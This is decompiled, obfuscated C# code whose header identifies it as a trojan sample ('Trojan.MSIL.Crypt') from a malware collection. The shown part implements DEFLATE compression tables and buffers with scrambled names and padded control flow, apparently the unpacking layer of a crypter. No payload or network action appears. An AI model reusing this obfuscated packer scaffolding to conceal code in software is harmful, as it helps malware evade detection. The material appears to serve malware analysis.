// Decompiled with JetBrains decompiler
// Type: .
// Assembly: syncui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=cab8849a7bf7875b
// MVID: B8136FDA-4EB0-4CA7-9502-281BC34A634B
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.hjc-f20e5d33e431ce6f4aedcb085c959ae1bda3809f8f5bbdd4d18dd58683a28d4d.exe

using \u0001;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace \u0006
{
  internal class \u0001
  {
    public static string \u0001;

    internal sealed class \u0001
    {
      internal static readonly int[] \u0001;
      internal static readonly int[] \u0002;
      internal static readonly int[] \u0003;
      internal static readonly int[] \u0004;
      internal int \u0001;
      internal int \u0002;
      internal int \u0003;
      internal int \u0004;
      internal int \u0005;
      internal bool \u0001;
      internal \u0006.\u0001.\u0002 \u0001;
      internal \u0006.\u0001.\u0003 \u0001;
      internal \u0006.\u0001.\u0005 \u0001;
      internal \u0006.\u0001.\u0004 \u0001;
      internal \u0006.\u0001.\u0004 \u0002;

      public \u0001([In] byte[] obj0)
      {
        try
        {
          this.\u0001 = new \u0006.\u0001.\u0002();
          this.\u0001 = new \u0006.\u0001.\u0003();
          this.\u0001 = 2;
          \u0012.\u0001(obj0, 0, this.\u0001, obj0.Length);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0012.\u0001(ex, (object) this, (object) numArray);
          throw;
        }
      }

      static \u0001()
      {
        try
        {
          do
          {
            do
            {
              if (true)
              {
                \u0006.\u0001.\u0001.\u0001 = new int[29]
                {
                  3,
                  4,
                  5,
                  6,
                  7,
                  8,
                  9,
                  10,
                  11,
                  13,
                  15,
                  17,
                  19,
                  23,
                  27,
                  31,
                  35,
                  43,
                  51,
                  59,
                  67,
                  83,
                  99,
                  115,
                  131,
                  163,
                  195,
                  227,
                  258
                };
                \u0006.\u0001.\u0001.\u0002 = new int[29]
                {
                  0,
                  0,
                  0,
                  0,
                  0,
                  0,
                  0,
                  0,
                  1,
                  1,
                  1,
                  1,
                  2,
                  2,
                  2,
                  2,
                  3,
                  3,
                  3,
                  3,
                  4,
                  4,
                  4,
                  4,
                  5,
                  5,
                  5,
                  5,
                  0
                };
              }
            }
            while (false);
            if (true)
              \u0006.\u0001.\u0001.\u0003 = new int[30]
              {
                1,
                2,
                3,
                4,
                5,
                7,
                9,
                13,
                17,
                25,
                33,
                49,
                65,
                97,
                129,
                193,
                257,
                385,
                513,
                769,
                1025,
                1537,
                2049,
                3073,
                4097,
                6145,
                8193,
                12289,
                16385,
                24577
              };
            \u0006.\u0001.\u0001.\u0004 = new int[30]
            {
              0,
              0,
              0,
              0,
              1,
              1,
              2,
              2,
              3,
              3,
              4,
              4,
              5,
              5,
              6,
              6,
              7,
              7,
              8,
              8,
              9,
              9,
              10,
              10,
              11,
              11,
              12,
              12,
              13,
              13
            };
          }
          while (false);
        }
        catch (Exception ex)
        {
          \u0012.\u0001(ex);
          throw;
        }
      }
    }

    internal sealed class \u0002
    {
      internal byte[] \u0001;
      internal int \u0001 = 0;
      internal int \u0002 = 0;
      internal uint \u0001 = 0;
      internal int \u0003 = 0;
    }

    internal sealed class \u0003
    {
      internal byte[] \u0001 = new byte[32768];
      internal int \u0001 = 0;
      internal int \u0002 = 0;
    }

    internal sealed class \u0004
    {
      internal short[] \u0001;
      public static readonly \u0006.\u0001.\u0004 \u0001;
      public static readonly \u0006.\u0001.\u0004 \u0002;

      static \u0004()
      {
        int num1;
        byte[] numArray1;
        try
        {
          int length1 = 288;
          if (length1 != 0)
          {
            numArray1 = new byte[length1];
            length1 = 0;
          }
          num1 = length1;
          while (true)
          {
            if (num1 < 144)
            {
              if (true)
              {
                if (true)
                {
                  numArray1[num1++] = (byte) 8;
                  continue;
                }
                break;
              }
            }
            else
              goto label_20;
label_19:
            numArray1[num1++] = (byte) 9;
label_20:
            if (num1 < 256)
              goto label_19;
            else
              goto label_6;
          }
          goto label_13;
label_6:
          if (num1 >= 280)
          {
            int length2;
            while (true)
            {
              int num2 = num1;
              while (true)
              {
                if (num2 >= 288)
                {
                  \u0006.\u0001.\u0004.\u0001 = new \u0006.\u0001.\u0004(numArray1);
                  length2 = 32;
                  if (length2 == 0)
                    num2 = length2;
                  else
                    goto label_11;
                }
                else
                  break;
              }
              numArray1[num1++] = (byte) 8;
            }
label_11:
            numArray1 = new byte[length2];
            num1 = 0;
          }
          else
            goto label_21;
label_13:
          while (num1 < 32)
            numArray1[num1++] = (byte) 5;
          \u0006.\u0001.\u0004.\u0002 = new \u0006.\u0001.\u0004(numArray1);
          if (true)
            return;
label_21:
          numArray1[num1++] = (byte) 7;
          goto label_6;
        }
        catch (Exception ex)
        {
          byte[] numArray2 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num1;
          \u0012.\u0001(ex, (object) numArray2, (object) local);
          throw;
        }
      }

      public \u0004([In] byte[] obj0)
      {
        try
        {
          \u0012.\u0001(obj0, this);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0012.\u0001(ex, (object) this, (object) numArray);
          throw;
        }
      }
    }

    internal sealed class \u0005
    {
      internal static readonly int[] \u0001;
      internal static readonly int[] \u0002;
      internal byte[] \u0001;
      internal byte[] \u0002;
      internal \u0006.\u0001.\u0004 \u0001;
      internal int \u0001;
      internal int \u0002;
      internal int \u0003;
      internal int \u0004;
      internal int \u0005;
      internal int \u0006;
      internal byte \u0001;
      internal int \u0007;
      internal static readonly int[] \u0003;

      static \u0005()
      {
        try
        {
          \u0006.\u0001.\u0005.\u0001 = new int[3]
          {
            3,
            3,
            11
          };
          \u0006.\u0001.\u0005.\u0002 = new int[3]
          {
            2,
            3,
            7
          };
          \u0006.\u0001.\u0005.\u0003 = new int[19]
          {
            16,
            17,
            18,
            0,
            8,
            7,
            9,
            6,
            10,
            5,
            11,
            4,
            12,
            3,
            13,
            2,
            14,
            1,
            15
          };
        }
        catch (Exception ex)
        {
          \u0012.\u0001(ex);
          throw;
        }
      }
    }

    internal sealed class \u0006
    {
      internal int \u0001 = 16;
      internal long \u0001 = 0;
      internal \u0006.\u0001.\u000E \u0001;
      internal \u0006.\u0001.\u0008 \u0001;

      public \u0006()
      {
        try
        {
          this.\u0001 = new \u0006.\u0001.\u000E();
          this.\u0001 = new \u0006.\u0001.\u0008(this.\u0001);
        }
        catch (Exception ex)
        {
          \u0012.\u0001(ex, (object) this);
          throw;
        }
      }
    }

    internal sealed class \u0007
    {
      internal static readonly int[] \u0001;
      internal static readonly byte[] \u0001;
      internal \u0006.\u0001.\u000E \u0001;
      internal \u0006.\u0001.\u0007.\u0001 \u0001;
      internal \u0006.\u0001.\u0007.\u0001 \u0002;
      internal \u0006.\u0001.\u0007.\u0001 \u0003;
      internal short[] \u0001;
      internal byte[] \u0002;
      internal int \u0001;
      internal int \u0002;
      internal static readonly short[] \u0002;
      internal static readonly byte[] \u0003;
      internal static readonly short[] \u0003;
      internal static readonly byte[] \u0004;

      static \u0007()
      {
        int index;
        try
        {
          \u0006.\u0001.\u0007.\u0001 = new int[19]
          {
            16,
            17,
            18,
            0,
            8,
            7,
            9,
            6,
            10,
            5,
            11,
            4,
            12,
            3,
            13,
            2,
            14,
            1,
            15
          };
          \u0006.\u0001.\u0007.\u0001 = new byte[16]
          {
            (byte) 0,
            (byte) 8,
            (byte) 4,
            (byte) 12,
            (byte) 2,
            (byte) 10,
            (byte) 6,
            (byte) 14,
            (byte) 1,
            (byte) 9,
            (byte) 5,
            (byte) 13,
            (byte) 3,
            (byte) 11,
            (byte) 7,
            (byte) 15
          };
          int length = 286;
          while (true)
          {
            \u0006.\u0001.\u0007.\u0002 = new short[length];
            \u0006.\u0001.\u0007.\u0003 = new byte[286];
            int num1;
            do
            {
              index = 0;
              int num2;
              while (true)
              {
                num1 = index;
                if (true)
                {
                  num2 = 144;
                  if (num2 != 0)
                  {
                    if (num1 < num2)
                    {
                      \u0006.\u0001.\u0007.\u0002[index] = \u0012.\u0001(48 + index << 8);
                      if (true)
                        \u0006.\u0001.\u0007.\u0003[index++] = (byte) 8;
                      else
                        goto label_10;
                    }
                    else
                      break;
                  }
                  else
                    goto label_9;
                }
                else
                  goto label_23;
              }
label_8:
              int num3 = index;
              num2 = 256;
              num1 = num3;
label_9:
              if (num1 < num2)
              {
                \u0006.\u0001.\u0007.\u0002[index] = \u0012.\u0001(256 + index << 7);
                \u0006.\u0001.\u0007.\u0003[index++] = (byte) 9;
                goto label_8;
              }
label_10:;
            }
            while (false);
            break;
label_23:
            length = num1;
          }
          for (; index < 280; \u0006.\u0001.\u0007.\u0003[index++] = (byte) 7)
          {
            \u0006.\u0001.\u0007.\u0002[index] = \u0012.\u0001(index - 256 << 9);
            if (false)
              goto label_19;
          }
label_15:
          for (; index < 286; \u0006.\u0001.\u0007.\u0003[index++] = (byte) 8)
            \u0006.\u0001.\u0007.\u0002[index] = \u0012.\u0001(index - 88 << 8);
          \u0006.\u0001.\u0007.\u0003 = new short[30];
          \u0006.\u0001.\u0007.\u0004 = new byte[30];
          index = 0;
label_19:
          for (; index < 30; ++index)
          {
            \u0006.\u0001.\u0007.\u0003[index] = \u0012.\u0001(index << 11);
            if (true)
              \u0006.\u0001.\u0007.\u0004[index] = (byte) 5;
            else
              goto label_15;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) index;
          \u0012.\u0001(ex, (object) local);
          throw;
        }
      }

      public \u0007([In] \u0006.\u0001.\u000E obj0)
      {
        try
        {
          this.\u0001 = obj0;
          this.\u0001 = new \u0006.\u0001.\u0007.\u0001(this, 286, 257, 15);
          this.\u0002 = new \u0006.\u0001.\u0007.\u0001(this, 30, 1, 15);
          this.\u0003 = new \u0006.\u0001.\u0007.\u0001(this, 19, 4, 7);
          this.\u0001 = new short[16384];
          this.\u0002 = new byte[16384];
        }
        catch (Exception ex)
        {
          \u0006.\u0001.\u000E obj = obj0;
          \u0012.\u0001(ex, (object) this, (object) obj);
          throw;
        }
      }

      public sealed class \u0001
      {
        public short[] \u0001;
        public byte[] \u0001;
        public int \u0001;
        public int \u0002;
        internal short[] \u0002;
        internal int[] \u0001;
        internal int \u0003;
        internal \u0006.\u0001.\u0007 \u0001;

        public \u0001([In] \u0006.\u0001.\u0007 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
        {
          try
          {
            this.\u0001 = obj0;
            this.\u0001 = obj2;
            this.\u0003 = obj3;
            this.\u0001 = new short[obj1];
            this.\u0001 = new int[obj3];
          }
          catch (Exception ex)
          {
            \u0006.\u0001.\u0007 obj = obj0;
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) obj1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) obj2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) obj3;
            \u0012.\u0001(ex, (object) this, (object) obj, (object) local1, (object) local2, (object) local3);
            throw;
          }
        }
      }
    }

    internal sealed class \u0008
    {
      internal int \u0001;
      internal short[] \u0001;
      internal short[] \u0002;
      internal int \u0002;
      internal int \u0003;
      internal bool \u0001;
      internal int \u0004;
      internal int \u0005;
      internal int \u0006;
      internal byte[] \u0001;
      internal byte[] \u0002;
      internal int \u0007;
      internal int \u0008;
      internal int \u000E;
      internal \u0006.\u0001.\u000E \u0001;
      internal \u0006.\u0001.\u0007 \u0001;

      public \u0008([In] \u0006.\u0001.\u000E obj0)
      {
        int num;
        try
        {
          this.\u0001 = obj0;
          this.\u0001 = new \u0006.\u0001.\u0007(obj0);
          this.\u0001 = new byte[65536];
          this.\u0001 = new short[32768];
          this.\u0002 = new short[32768];
          this.\u0005 = num = 1;
          this.\u0004 = num;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num;
          \u0006.\u0001.\u000E obj = obj0;
          \u0012.\u0001(ex, (object) local, (object) this, (object) obj);
          throw;
        }
      }
    }

    internal sealed class \u000E
    {
      protected internal byte[] \u0001 = new byte[65536];
      internal int \u0001 = 0;
      internal int \u0002 = 0;
      internal uint \u0001 = 0;
      internal int \u0003 = 0;
    }

    internal sealed class \u000F : MemoryStream
    {
      public \u000F()
      {
      }

      public \u000F([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
